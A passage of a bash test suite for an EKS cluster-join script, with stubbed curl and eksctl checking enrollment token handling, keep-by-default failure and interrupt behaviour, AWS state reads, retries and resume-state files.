grep -q "apply" "${WORK}/calls" \
  && fail "ensure_storage created a StorageClass before CSI was ready: $(cat "${WORK}/calls")"
pass "ensure_storage waits for the CSI controller before creating a StorageClass"

XDG_CACHE_HOME="${WORK}/cache"
export XDG_CACHE_HOME
printf '%s' '{"cluster":"spoke-a","agentToken":"agt_cached"}' >"${WORK}/enroll-body"
FAKE_ENROLL_CODE="200"
export FAKE_ENROLL_CODE
cat >"${FAKE}/curl" <<EOF
#!/usr/bin/env bash
echo "curl \$*" >>"${WORK}/calls"
prev=""
for arg in "\$@"; do
  if [[ "\$prev" == "-H" && "\${arg}" == @* ]]; then
    cat "\${arg#@}" >"${WORK}/enroll-header"
  fi
  prev="\$arg"
done
printf '%s\n%s' "\$(cat '${WORK}/enroll-body')" "\${FAKE_ENROLL_CODE}"
EOF
chmod +x "${FAKE}/curl"
: >"${WORK}/calls"
ENROLL_CACHE="$(enrollment_cache_path "jnt_one")"
got="$(load_enrollment "jnt_one" "https://hub.example" "${ENROLL_CACHE}")"
[[ "$got" == '{"cluster":"spoke-a","agentToken":"agt_cached"}' ]] \
  || fail "load_enrollment did not return the hub body: ${got}"
[[ -f "${WORK}/enroll-header" ]] \
  || fail "load_enrollment did not send an authorization header file"
[[ "$(cat "${WORK}/enroll-header")" == "Authorization: Bearer jnt_one" ]] \
  || fail "load_enrollment did not send the join token as a bearer token"
grep -q "jnt_one" "${WORK}/calls" \
  && fail "load_enrollment put the join token on the curl command line: $(cat "${WORK}/calls")"
FAKE_ENROLL_CODE="401"
printf '%s' 'unauthorized' >"${WORK}/enroll-body"
got="$(load_enrollment "jnt_one" "https://hub.example" "${ENROLL_CACHE}")"
[[ "$got" == '{"cluster":"spoke-a","agentToken":"agt_cached"}' ]] \
  || fail "load_enrollment did not reuse the saved enrollment: ${got}"
pass "load_enrollment sends the join token off argv and retries from the saved enrollment"

grep -q 'preview_enrollment "$TOKEN"' "${SCRIPT}" \
  || fail "a dry run has no non-consuming preview path"
: >"${WORK}/calls"
rm -f "${ENROLL_CACHE}"
FAKE_ENROLL_CODE="200"
printf '%s' '{"cluster":"spoke-a"}' >"${WORK}/enroll-body"
got="$(preview_enrollment "jnt_one" "https://hub.example" "${ENROLL_CACHE}")"
[[ "$got" == '{"cluster":"spoke-a"}' ]] \
  || fail "preview_enrollment did not return the hub body: ${got}"
[[ ! -f "${ENROLL_CACHE}" ]] \
  || fail "preview_enrollment wrote the enrollment cache"
grep -q "preview=1" "${WORK}/calls" \
  || fail "preview_enrollment did not ask for a preview: $(cat "${WORK}/calls")"
: >"${WORK}/calls"
got="$(preview_enrollment "jnt_one" "https://hub.example" "${ENROLL_CACHE}")"
grep -q "preview=1" "${WORK}/calls" \
  || fail "a second preview did not ask the hub again: $(cat "${WORK}/calls")"
printf '%s' '{"cluster":"spoke-a","agentToken":"agt_cached"}' >"${ENROLL_CACHE}"
: >"${WORK}/calls"
got="$(preview_enrollment "jnt_one" "https://hub.example" "${ENROLL_CACHE}")"
[[ "$got" == '{"cluster":"spoke-a","agentToken":"agt_cached"}' ]] \
  || fail "preview_enrollment did not reuse the saved enrollment: ${got}"
grep -q "enrollment" "${WORK}/calls" \
  && fail "preview_enrollment called the hub when a cache was already there: $(cat "${WORK}/calls")"
pass "preview_enrollment does not spend the invitation or write the cache"

CREATED_CLUSTER=0 CREATED_NODEGROUP=0 CREATED_BUCKET=0 CREATED_AGENT=0 CREATED_FLUX=0 INSTALLED_PLATFORM=0 CREATED_IAM_USER=0
NAME="spoke-a" REGION="us-west-2"
(
  true
  on_exit
)
[[ ! -f "${ENROLL_CACHE}" ]] \
  || fail "a successful join left the enrollment cache"
pass "on_exit deletes the enrollment cache after success"

ENROLL_CACHE="${WORK}/enroll.json"
printf '%s' '{"agentToken":"agt_cached"}' >"${ENROLL_CACHE}"
(
  false
  on_exit
) || true
[[ -f "${ENROLL_CACHE}" ]] \
  || fail "a failed join deleted the enrollment cache"
pass "on_exit keeps the enrollment cache after failure"

# --- a failed run keeps what it built, and an interrupt always does ---
# Any failure after eksctl had built a control plane used to run
# eksctl delete cluster, so one dropped second cost the customer the cluster
# and a second one to rebuild it. Keep is the default now, and an interrupt
# keeps whatever the policy says.

reset_join_flags() {
  CREATED_CLUSTER=0
  CREATED_NODEGROUP=0
  CREATED_BUCKET=0
  CREATED_AGENT=0
  CREATED_FLUX=0
  APPLIED_FLUX=0
  FLUX_APPLIED_NAMES=""
  INSTALLED_PLATFORM=0
  CREATED_IAM_USER=0
  CREATED_ACCESS_KEY_ID=""
  CREATED_CSI_STACK=0
  APPLIED_BUCKET_TO_EXISTING=0
  APPLIED_IDENTITY_TO_EXISTING=0
  STATE_CLUSTER=0
  STATE_NODEGROUP=0
  STATE_BUCKET=0
  STATE_FLUX=0
  STATE_AGENT=0
  STATE_IAM_USER=0
  STATE_PLATFORM=0
  STATE_CSI_STACK=0
  STATE_ACCESS_KEY_IDS=""
  SPOKE_IAM_USER=""
  rm -f "${WORK}/fake-stacks" "${WORK}/stack-err-done"
  INTERRUPTED=0
  ON_FAILURE="keep"
  LOCAL=0
  NAME="spoke-a"
  REGION="us-west-2"
  NODEGROUP="ng-1"
  BUCKET="pds-123456789012-spoke-a"
  ENROLL_CACHE=""
  PHASE="installing Percona Database Service"
  PHASE_LAST=""
  KUBERNETES_VERSION=""
  WAIT_INTERVAL=0
  XDG_STATE_HOME="${WORK}/state"
  AWS_ACCOUNT_ID=""
  ROLLBACK_FAILED=0
  tmp="${WORK}/scratch"
  mkdir -p "$tmp"
  rm -f "${WORK}/cluster-status-idx" "${WORK}/nodegroup-status-idx"
  : >"${WORK}/calls"
}

reset_join_flags
CREATED_CLUSTER=1
(
  false
  on_exit
) 2>"${WORK}/keep.err" || true
grep -q "eksctl delete cluster" "${WORK}/calls" \
  && fail "a failed run deleted the EKS cluster under the default policy: $(cat "${WORK}/calls")"
pass "a failure after the control plane exists leaves the cluster in place"

grep -q "same command again" "${WORK}/keep.err" \
  || fail "the keep path did not say how to resume: $(cat "${WORK}/keep.err")"
grep -q "installing Percona Database Service" "${WORK}/keep.err" \
  || fail "the keep path did not name the phase it reached: $(cat "${WORK}/keep.err")"
pass "the keep path prints the phase reached and how to resume"

reset_join_flags
CREATED_CLUSTER=1
CREATED_BUCKET=1
(
  false
  on_exit
) 2>"${WORK}/teardown.err" || true
grep -qF "bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/teardown.err" \
  || fail "the teardown offer does not name the environment and region: $(cat "${WORK}/teardown.err")"
grep -q "eksctl delete cluster\|aws s3 rb" "${WORK}/teardown.err" \
  && fail "the teardown offer still lists hand-copied deletes: $(cat "${WORK}/teardown.err")"
grep -qE '(^|[^A-Za-z-])(NAME|REGION)([^A-Za-z-]|$)' "${WORK}/teardown.err" \
  && fail "the teardown offer still prints a placeholder instead of the real name: $(cat "${WORK}/teardown.err")"
pass "the teardown offer is the delete command for the real environment"

reset_join_flags
ON_FAILURE="rollback"
INTERRUPTED=1
CREATED_CLUSTER=1
CREATED_BUCKET=1
CREATED_IAM_USER=1
CREATED_ACCESS_KEY_ID="AKIANEW00000000000000"
(
  false
  on_exit
) 2>"${WORK}/interrupt.err" || true
grep -q "delete" "${WORK}/calls" \
  && fail "an interrupt deleted a resource even though an interrupt is a pause: $(cat "${WORK}/calls")"
grep -q "rb s3://" "${WORK}/calls" \
  && fail "an interrupt deleted the S3 bucket: $(cat "${WORK}/calls")"
pass "Ctrl-C leaves every resource in place, whatever the failure policy says"

reset_join_flags
ON_FAILURE="rollback"
CREATED_CLUSTER=1
(
  false
  on_exit
) 2>/dev/null || true
grep -q "eksctl delete cluster --name spoke-a" "${WORK}/calls" \
  || fail "rollback did not delete the cluster this run created: $(cat "${WORK}/calls")"
pass "on-failure rollback still removes what the run created"

reset_join_flags
CREATED_BUCKET=1
CREATED_IAM_USER=1
CREATED_ACCESS_KEY_ID="AKIANEW00000000000000"
INSTALLED_PLATFORM=1
(
  false
  on_exit
) 2>/dev/null || true
grep -q "rb s3://" "${WORK}/calls" \
  && fail "the keep path deleted the S3 bucket: $(cat "${WORK}/calls")"
grep -q "iam delete-user" "${WORK}/calls" \
  && fail "the keep path deleted the IAM user: $(cat "${WORK}/calls")"
grep -q "helm uninstall" "${WORK}/calls" \
  && fail "the keep path uninstalled the platform: $(cat "${WORK}/calls")"
pass "the keep path leaves the bucket, the identity and the platform alone"

reset_join_flags
valid_on_failure "keep" || fail "valid_on_failure rejected keep"
valid_on_failure "rollback" || fail "valid_on_failure rejected rollback"
if valid_on_failure "nonsense"; then
  fail "valid_on_failure accepted an unknown policy"
fi
pass "the failure policy accepts keep and rollback only"

if bash "${SCRIPT}" --token t --on-failure nonsense >/dev/null 2>"${WORK}/argv.err"; then
  fail "the script accepted an unknown --on-failure value"
fi
grep -q "on-failure" "${WORK}/argv.err" \
  || fail "an unknown --on-failure value was not explained: $(cat "${WORK}/argv.err")"
pass "an unknown --on-failure value is refused before anything runs"

# The default is the fix. The fixture sets ON_FAILURE explicitly, so without
# this the policy could be flipped back to rollback and every case above would
# still pass.
grep -q 'ON_FAILURE="${ON_FAILURE:-keep}"' "${SCRIPT}" \
  || fail "a failed run does not keep by default: $(grep -n 'ON_FAILURE=' "${SCRIPT}" | head -1)"
pass "keeping what a failed run created is the default"

# The script has to hand INT and TERM to on_interrupt, or the policy below is
# wired to nothing.
grep -qE '^trap on_interrupt INT TERM$' "${SCRIPT}" \
  || fail "INT and TERM do not reach on_interrupt: $(grep -n '^trap ' "${SCRIPT}")"

# Then drive the whole chain with a real signal rather than by setting the
# flag by hand: SIGINT to on_interrupt, on_interrupt to exit, exit to on_exit.
# The policy is rollback and the cluster is this run's, so this is the exact
# shape that used to destroy a control plane.
# In its own process, because a subshell cannot signal itself portably: $$
# stays the parent's pid there, and BASHPID needs a bash this suite does not
# require.
cat >"${WORK}/interrupt-run.sh" <<EOS
#!/usr/bin/env bash
set -euo pipefail
source "${WORK}/functions.sh"
CREATED_CLUSTER=1
CREATED_NODEGROUP=0
CREATED_BUCKET=1
CREATED_AGENT=0
CREATED_FLUX=0
APPLIED_FLUX=0
FLUX_APPLIED_NAMES=""
INSTALLED_PLATFORM=0
CREATED_IAM_USER=0
CREATED_CSI_STACK=0
CREATED_ACCESS_KEY_ID=""
APPLIED_BUCKET_TO_EXISTING=0
APPLIED_IDENTITY_TO_EXISTING=0
INTERRUPTED=0
ON_FAILURE="rollback"
STATUS_ONLY=0
DRY_RUN=0
NAME="spoke-a"
REGION="us-west-2"
NODEGROUP="ng-1"
BUCKET="pds-123456789012-spoke-a"
ENROLL_CACHE=""
PHASE="creating the EKS cluster"
XDG_STATE_HOME="${WORK}/state-signal"
CLUSTER_DELETE_TIMEOUT="45m"
tmp="${WORK}/signal-scratch"
mkdir -p "\$tmp"
trap on_exit EXIT
trap on_interrupt INT TERM
kill -INT "\$\$"
sleep 1
EOS
: >"${WORK}/calls"
bash "${WORK}/interrupt-run.sh" 2>"${WORK}/signal.err" || true
grep -q "delete" "${WORK}/calls" \
  && fail "a real SIGINT still deleted a resource: $(cat "${WORK}/calls")"
grep -q "rb s3://" "${WORK}/calls" \
  && fail "a real SIGINT still deleted the S3 bucket: $(cat "${WORK}/calls")"
grep -q "interrupted. Nothing was deleted." "${WORK}/signal.err" \
  || fail "a real SIGINT did not take the keep path: $(cat "${WORK}/signal.err")"
set +e
bash "${WORK}/interrupt-run.sh" 2>/dev/null
sig_rc=$?
set -e
[[ "$sig_rc" -eq 130 ]] \
  || fail "a real SIGINT exited ${sig_rc} rather than 130"
pass "a real SIGINT reaches on_interrupt and keeps everything"

# Returning 0 from the EXIT trap used to replace a failed join's status, so
# callers and CI treated an incomplete join as a pass.
cat >"${WORK}/fail-status.sh" <<EOS
#!/usr/bin/env bash
set -euo pipefail
source "${WORK}/functions.sh"
CREATED_CLUSTER=1
CREATED_NODEGROUP=0
CREATED_BUCKET=0
CREATED_AGENT=0
CREATED_FLUX=0
APPLIED_FLUX=0
FLUX_APPLIED_NAMES=""
INSTALLED_PLATFORM=0
CREATED_IAM_USER=0
CREATED_CSI_STACK=0
CREATED_ACCESS_KEY_ID=""
APPLIED_BUCKET_TO_EXISTING=0
APPLIED_IDENTITY_TO_EXISTING=0
INTERRUPTED=0
ON_FAILURE="keep"
STATUS_ONLY=0
DRY_RUN=0
NAME="spoke-a"
REGION="us-west-2"
NODEGROUP="ng-1"
BUCKET="pds-123456789012-spoke-a"
ENROLL_CACHE=""
PHASE="creating the EKS cluster"
XDG_STATE_HOME="${WORK}/state-fail-status"
tmp="${WORK}/fail-status-scratch"
mkdir -p "\$tmp"
trap on_exit EXIT
exit 7
EOS
set +e
bash "${WORK}/fail-status.sh" 2>/dev/null
fail_rc=$?
set -e
[[ "$fail_rc" -eq 7 ]] \
  || fail "a failed join exited ${fail_rc} rather than 7 because the EXIT trap returned success"
pass "the EXIT trap preserves a failed join status"

# --- cluster and node group state is read, not inferred from an exit code ---
# describe-cluster exits 0 for CREATING, DELETING, UPDATING and FAILED, so the
# old exit code check read a half built cluster as ready to use.
# The fakes are separate programs, so these have to be exported rather than
# set as a prefix on a plain assignment.
reset_join_flags
export FAKE_CLUSTER_STATUS="CREATING"
got="$(cluster_state spoke-a us-west-2)"
[[ "$got" == "CREATING" ]] || fail "cluster_state did not report CREATING: ${got}"
FAKE_CLUSTER_STATUS="UPDATING"
got="$(cluster_state spoke-a us-west-2)"
[[ "$got" == "UPDATING" ]] || fail "cluster_state did not report UPDATING: ${got}"
FAKE_CLUSTER_STATUS="ABSENT"
got="$(cluster_state spoke-a us-west-2)"
[[ "$got" == "ABSENT" ]] || fail "cluster_state did not report a missing cluster as ABSENT: ${got}"
unset FAKE_CLUSTER_STATUS
export FAKE_NODEGROUP_STATUS="CREATE_FAILED"
got="$(nodegroup_state spoke-a ng-1 us-west-2)"
[[ "$got" == "CREATE_FAILED" ]] || fail "nodegroup_state did not report CREATE_FAILED: ${got}"
unset FAKE_NODEGROUP_STATUS
export FAKE_STACK_STATUS="ROLLBACK_COMPLETE"
got="$(cluster_stack_state spoke-a us-west-2)"
[[ "$got" == "ROLLBACK_COMPLETE" ]] || fail "cluster_stack_state did not report the stack: ${got}"
unset FAKE_STACK_STATUS
got="$(cluster_stack_state spoke-a us-west-2)"
[[ "$got" == "ABSENT" ]] || fail "cluster_stack_state did not report a missing stack as ABSENT: ${got}"
pass "cluster, node group and stack state are read from AWS"

# An account this run cannot read must never be treated as an empty one: that
# is how the reported second control plane got built and billed.
reset_join_flags
got="$(aws_state "AccessDeniedException: not authorized" 254)"
[[ "$got" == "UNKNOWN" ]] \
  || fail "a call that failed for a reason other than absence read as ${got}"
got="$(aws_state "" 0)"
[[ "$got" == "UNKNOWN" ]] || fail "an empty answer read as a status: ${got}"
got="$(aws_state "None" 0)"
[[ "$got" == "UNKNOWN" ]] || fail "a None answer read as a status: ${got}"
pass "an unreadable account answers UNKNOWN rather than ABSENT"

reset_join_flags
if FAKE_CLUSTER_STATUS="UNREADABLE" ensure_cluster >/dev/null 2>"${WORK}/unknown.err"; then
  fail "ensure_cluster carried on with a cluster state it could not read"
fi
grep -q "eksctl create" "${WORK}/calls" \
  && fail "ensure_cluster created something it could not first read: $(cat "${WORK}/calls")"
grep -q "cannot read the state" "${WORK}/unknown.err" \
  || fail "an unreadable cluster state was not explained: $(cat "${WORK}/unknown.err")"
pass "an unreadable cluster state refuses rather than creating a second cluster"

reset_join_flags
FAKE_CLUSTER_STATUS_SEQ="CREATING CREATING ACTIVE" FAKE_NODEGROUP_STATUS="ACTIVE" \
  ensure_cluster >"${WORK}/creating.out" 2>&1
grep -q "eksctl create cluster" "${WORK}/calls" \
  && fail "a second run created another cluster while the first was still CREATING: $(cat "${WORK}/calls")"
grep -q "CREATING" "${WORK}/creating.out" \
  || fail "the run did not say it was waiting on a CREATING cluster: $(cat "${WORK}/creating.out")"
pass "a second run against a CREATING cluster waits for it"

reset_join_flags
FAKE_CLUSTER_STATUS_SEQ="DELETING DELETING ABSENT" \
  ensure_cluster >"${WORK}/deleting.out" 2>&1
grep -q "eksctl create cluster" "${WORK}/calls" \
  || fail "the run did not create a cluster after the delete finished: $(cat "${WORK}/calls")"
grep -q "DELETING" "${WORK}/deleting.out" \
  || fail "the run did not say it was waiting out a delete: $(cat "${WORK}/deleting.out")"
pass "a run against a DELETING cluster waits that delete out before creating"

reset_join_flags
if FAKE_CLUSTER_STATUS="FAILED" ensure_cluster >/dev/null 2>"${WORK}/failed.err"; then
  fail "the run used a FAILED cluster"
fi
grep -q "eksctl delete cluster --name spoke-a --region us-west-2" "${WORK}/failed.err" \
  || fail "a FAILED cluster was refused without a command to run: $(cat "${WORK}/failed.err")"
grep -q "eksctl create" "${WORK}/calls" \
  && fail "the run created something against a FAILED cluster: $(cat "${WORK}/calls")"
pass "a FAILED cluster is refused with a command the customer can run"

reset_join_flags
if FAKE_CLUSTER_STATUS="ABSENT" FAKE_STACK_STATUS="ROLLBACK_COMPLETE" \
  ensure_cluster >/dev/null 2>"${WORK}/stack.err"; then
  fail "the run called eksctl create cluster with a leftover stack in the way"
fi
grep -q "eksctl-spoke-a-cluster" "${WORK}/stack.err" \
  || fail "the leftover stack was not named: $(cat "${WORK}/stack.err")"
grep -q "eksctl delete cluster --name spoke-a --region us-west-2" "${WORK}/stack.err" \
  || fail "the leftover stack was refused without a command to run: $(cat "${WORK}/stack.err")"
grep -q "eksctl create cluster" "${WORK}/calls" \
  && fail "the run created a cluster over a leftover stack: $(cat "${WORK}/calls")"
pass "a leftover CloudFormation stack is refused with a command the customer can run"

reset_join_flags
if FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS="CREATE_FAILED" \
  ensure_cluster >/dev/null 2>"${WORK}/ngfailed.err"; then
  fail "the run waited on a CREATE_FAILED node group"
fi
grep -q "CREATE_FAILED" "${WORK}/ngfailed.err" \
  || fail "a CREATE_FAILED node group was not named: $(cat "${WORK}/ngfailed.err")"
grep -q "eksctl delete nodegroup" "${WORK}/ngfailed.err" \
  || fail "a CREATE_FAILED node group was refused without a command to run: $(cat "${WORK}/ngfailed.err")"
pass "a CREATE_FAILED node group is named instead of timed out on"

reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS_SEQ="CREATING ACTIVE" \
  ensure_cluster >"${WORK}/ngcreating.out" 2>&1
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  && fail "the run created a second node group while one was CREATING: $(cat "${WORK}/calls")"
grep -q "CREATING" "${WORK}/ngcreating.out" \
  || fail "the run did not say it was waiting on a CREATING node group: $(cat "${WORK}/ngcreating.out")"
pass "a CREATING node group is waited on rather than duplicated"

reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS_SEQ="DELETING DELETING ABSENT" \
  ensure_cluster >"${WORK}/ngdeleting.out" 2>&1
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  || fail "the run did not create a node group after the delete finished: $(cat "${WORK}/calls")"
grep -q "DELETING" "${WORK}/ngdeleting.out" \
  || fail "the run did not say it was waiting out a node group delete: $(cat "${WORK}/ngdeleting.out")"
pass "a DELETING node group is waited out before creating"

reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS_SEQ="DELETING ACTIVE" \
  ensure_cluster >"${WORK}/ngdelactive.out" 2>&1
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  && fail "the run created a node group after a delete finished as ACTIVE: $(cat "${WORK}/calls")"
pass "a DELETING node group that settles ACTIVE is not created again"

reset_join_flags
if FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS_SEQ="DELETING CREATE_FAILED" \
  ensure_cluster >/dev/null 2>"${WORK}/ngdelfail.err"; then
  fail "the run used a node group that finished deleting as CREATE_FAILED"
fi
grep -q "CREATE_FAILED" "${WORK}/ngdelfail.err" \
  || fail "a node group that settled CREATE_FAILED was not named: $(cat "${WORK}/ngdelfail.err")"
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  && fail "the run created a node group over CREATE_FAILED: $(cat "${WORK}/calls")"
pass "a DELETING node group that settles failed is refused"

reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS="ABSENT" \
  ensure_cluster >/dev/null 2>&1
grep -q "eksctl create nodegroup" "${WORK}/calls" \
  || fail "an ACTIVE cluster with no node group did not get one: $(cat "${WORK}/calls")"
grep -q "eksctl create cluster" "${WORK}/calls" \
  && fail "an ACTIVE cluster was built again: $(cat "${WORK}/calls")"
pass "an ACTIVE cluster with no node group gets a node group only"

# --- the cluster comes up on a version this script chose ---
reset_join_flags
got="$(FAKE_CLUSTER_VERSIONS="1.33 1.35 1.34" resolve_kubernetes_version)"
[[ "$got" == "1.35" ]] || fail "resolve_kubernetes_version did not pick the newest AWS offers: ${got}"
got="$(FAKE_CLUSTER_VERSIONS="1.9 1.10" resolve_kubernetes_version)"
[[ "$got" == "1.10" ]] || fail "resolve_kubernetes_version compared versions as text: ${got}"
got="$(FAKE_CLUSTER_VERSIONS_RC=1 resolve_kubernetes_version 2>/dev/null)"
[[ "$got" == "$(kubernetes_version_fallback)" ]] \
  || fail "resolve_kubernetes_version did not fall back to the pin: ${got}"
got="$(KUBERNETES_VERSION="1.31" resolve_kubernetes_version)"
[[ "$got" == "1.31" ]] || fail "KUBERNETES_VERSION did not override the query: ${got}"
pass "the Kubernetes version is queried, overridable, and pinned when AWS cannot answer"

reset_join_flags
KUBERNETES_VERSION="1.31" write_new_cluster_config
grep -q 'version: "1.31"' "${tmp}/cluster.yaml" \
  || fail "the ClusterConfig carries no Kubernetes version: $(cat "${tmp}/cluster.yaml")"
pass "the ClusterConfig pins the Kubernetes version rather than tracking eksctl"

reset_join_flags
FAKE_CLUSTER_STATUS="ABSENT" ensure_cluster >/dev/null 2>&1
grep -q "eksctl create cluster .*--timeout" "${WORK}/calls" \
  || fail "eksctl create cluster ran on its own default timeout: $(cat "${WORK}/calls")"
pass "eksctl create cluster is given an explicit timeout"

# eksctl reports a failed node group as "waiter state transitioned to
# Failure" and names nothing. The reason is a CREATE_FAILED stack event.
reset_join_flags
export FAKE_EKSCTL_RC=1
export FAKE_STACK_EVENTS_NAME="eksctl-spoke-a-nodegroup-ng-1"
FAKE_STACK_EVENTS="$(printf '%s\n' \
  $'Other\tResource creation cancelled' \
  $'NodeGroup\tinstance type t3.2xlarge is not supported in us-west-2d')"
export FAKE_STACK_EVENTS
if FAKE_CLUSTER_STATUS="ABSENT" ensure_cluster >/dev/null 2>"${WORK}/create-fail.err"; then
  fail "ensure_cluster treated a failed eksctl create as success"
fi
unset FAKE_EKSCTL_RC FAKE_STACK_EVENTS FAKE_STACK_EVENTS_NAME
grep -q "CloudFormation stack eksctl-spoke-a-nodegroup-ng-1 failed:" "${WORK}/create-fail.err" \
  || fail "a failed create did not name the node group stack: $(cat "${WORK}/create-fail.err")"
grep -q "not supported in us-west-2d" "${WORK}/create-fail.err" \
  || fail "a failed create hid the CloudFormation reason: $(cat "${WORK}/create-fail.err")"
grep -q "Resource creation cancelled" "${WORK}/create-fail.err" \
  && fail "a failed create printed the rollback noise: $(cat "${WORK}/create-fail.err")"
pass "a failed create prints the CloudFormation reason eksctl leaves out"

# The node group stack is checked first. A create that dies on the cluster
# stack still has to report that stack, not stop after the missing node group.
reset_join_flags
export FAKE_EKSCTL_RC=1
export FAKE_STACK_EVENTS_NAME="eksctl-spoke-a-cluster"
FAKE_STACK_EVENTS=$'ControlPlane\tCluster creation timed out waiting for the control plane'
export FAKE_STACK_EVENTS
if FAKE_CLUSTER_STATUS="ABSENT" ensure_cluster >/dev/null 2>"${WORK}/create-fail-cluster.err"; then
  fail "ensure_cluster treated a failed cluster stack as success"
fi
unset FAKE_EKSCTL_RC FAKE_STACK_EVENTS FAKE_STACK_EVENTS_NAME
grep -q "CloudFormation stack eksctl-spoke-a-cluster failed:" "${WORK}/create-fail-cluster.err" \
  || fail "a failed cluster stack was not named: $(cat "${WORK}/create-fail-cluster.err")"
grep -q "timed out waiting for the control plane" "${WORK}/create-fail-cluster.err" \
  || fail "a failed cluster stack hid its reason: $(cat "${WORK}/create-fail-cluster.err")"
grep -q "eksctl did not say which resource failed." "${WORK}/create-fail-cluster.err" \
  && fail "a failed cluster stack was reported as having no reason: $(cat "${WORK}/create-fail-cluster.err")"
pass "a failed create reports the cluster stack when the node group stack has no events"

reset_join_flags
export FAKE_EKSCTL_RC=1
if FAKE_CLUSTER_STATUS="ABSENT" ensure_cluster >/dev/null 2>"${WORK}/create-fail-quiet.err"; then
  fail "ensure_cluster treated a failed eksctl create with no events as success"
fi
unset FAKE_EKSCTL_RC
grep -q "eksctl did not say which resource failed." "${WORK}/create-fail-quiet.err" \
  || fail "a failed create with no events was not explained: $(cat "${WORK}/create-fail-quiet.err")"
grep -q "eksctl-spoke-a-nodegroup-ng-1 in us-west-2" "${WORK}/create-fail-quiet.err" \
  || fail "a failed create did not name the stack to read: $(cat "${WORK}/create-fail-quiet.err")"
pass "a failed create with no stack events names the stack to read"

# --- a dropped second is retried rather than turned into a teardown ---
cat >"${FAKE}/curl" <<EOF
#!/usr/bin/env bash
echo "curl \$*" >>"${WORK}/calls"
prev=""
for arg in "\$@"; do
  if [[ "\$prev" == "-o" ]]; then
    : >"\$arg"
  fi
  prev="\$arg"
done
if [[ -n "\${FAKE_ENROLL_CODE:-}" ]]; then
  cat "${WORK}/enroll-body" 2>/dev/null || true
  printf '\n%s' "\${FAKE_ENROLL_CODE}"
fi
exit 0
EOF
chmod +x "${FAKE}/curl"

reset_join_flags
printf '%s' '{"cluster":"spoke-a"}' >"${WORK}/enroll-body"
FAKE_ENROLL_CODE="200" load_enrollment "jnt_retry" "https://hub.example" "${WORK}/enroll-retry.json" >/dev/null
enroll_call="$(grep "^curl " "${WORK}/calls" | head -1 || true)"
[[ -n "$enroll_call" ]] || fail "enrollment ran no curl: $(cat "${WORK}/calls")"
[[ "$enroll_call" == *"--retry"* ]] \
  && fail "enrollment retries a request that spends the invitation: ${enroll_call}"
[[ "$enroll_call" == *"--connect-timeout"* && "$enroll_call" == *"--max-time"* ]] \
  || fail "enrollment has no connect or transfer timeout: ${enroll_call}"
pass "enrollment does not retry a request that spends the invitation"

reset_join_flags
HUB_URL="https://hub.example"
download_hub_chart >/dev/null 2>&1 || true
chart_call="$(grep "^curl " "${WORK}/calls" | grep "pds.tgz" | head -1 || true)"
[[ -n "$chart_call" ]] || fail "the chart download ran no curl: $(cat "${WORK}/calls")"
[[ "$chart_call" == *"--retry"* ]] \
  || fail "the chart download does not retry a dropped connection: ${chart_call}"
[[ "$chart_call" == *"--connect-timeout"* && "$chart_call" == *"--max-time"* ]] \
  || fail "the chart download has no connect or transfer timeout: ${chart_call}"
pass "the chart download retries a dropped connection"

reset_join_flags
FAKE_MISSING_CRDS="gitrepositories.source.toolkit.fluxcd.io" FLUX_SHA256="skip" \
  FLUX_VERSION="2.5.1" install_flux >/dev/null 2>&1 || true
flux_call="$(grep "^curl " "${WORK}/calls" | grep "install.yaml" | head -1 || true)"
[[ -n "$flux_call" ]] || fail "the Flux download ran no curl: $(cat "${WORK}/calls")"
[[ "$flux_call" == *"--retry"* ]] \
  || fail "the Flux download does not retry a dropped connection: ${flux_call}"
[[ "$flux_call" == *"--connect-timeout"* && "$flux_call" == *"--max-time"* ]] \
  || fail "the Flux download has no connect or transfer timeout: ${flux_call}"
pass "the Flux release download retries a dropped connection"
FAKE_MISSING_CRDS=""
FLUX_SHA256=""
APPLIED_FLUX=0
FLUX_APPLIED_NAMES=""

reset_join_flags
RETRY_DELAY=0
flaky_calls=0
flaky() {
  flaky_calls=$((flaky_calls + 1))
  [[ "$flaky_calls" -ge 3 ]]
}
retry 5 "a flaky step" flaky 2>/dev/null || fail "retry gave up on a step that recovers"
[[ "$flaky_calls" == 3 ]] || fail "retry did not stop at the first success: ${flaky_calls}"
always_fails() { return 1; }
if retry 2 "a broken step" always_fails 2>/dev/null; then
  fail "retry reported success for a step that never succeeds"
fi
pass "retry backs off and gives up on its budget"

# --- resume state survives between runs ---
reset_join_flags
rm -rf "${WORK}/state"
CREATED_CLUSTER=1
PHASE="creating the EKS cluster"
save_state
state_file="$(state_path spoke-a us-west-2)"
[[ -f "$state_file" ]] || fail "save_state wrote no state file at ${state_file}"
[[ "$state_file" == "${WORK}/state/pds/"* ]] \
  || fail "the state file ignored XDG_STATE_HOME: ${state_file}"
grep -q "creating the EKS cluster" "$state_file" \
  || fail "the state file does not record the phase: $(cat "$state_file")"
grep -q "STATE_CLUSTER=1" "$state_file" \
  || fail "the state file does not record what this run created: $(cat "$state_file")"
grep -q "CREATED_CLUSTER=" "$state_file" \
  && fail "the state file writes the names a run uses for its own deletes: $(cat "$state_file")"
[[ "$state_file" == *"-123456789012.env" ]] \
  || fail "the state file is not scoped to the AWS account: ${state_file}"
pass "save_state records the phase reached and what this run created"

reset_join_flags
AWS_ACCOUNT_ID="111111111111"
CREATED_CLUSTER=1
PHASE="creating the EKS cluster"
save_state
path_a="$(state_path spoke-a us-west-2)"
AWS_ACCOUNT_ID="222222222222"
path_b="$(state_path spoke-a us-west-2)"
[[ "$path_a" != "$path_b" ]] \
  || fail "two AWS accounts share a resume file: ${path_a}"
[[ -f "$path_a" ]] || fail "account 111111111111 has no resume file"
[[ ! -f "$path_b" ]] || fail "account 222222222222 inherited another account's resume file"
pass "resume state does not collide across AWS accounts"
AWS_ACCOUNT_ID=""

reset_join_flags
LOCAL=1
local_path="$(state_path spoke-a us-west-2)"
[[ "$local_path" == *"-local.env" ]] \
  || fail "a local join is not scoped away from AWS: ${local_path}"
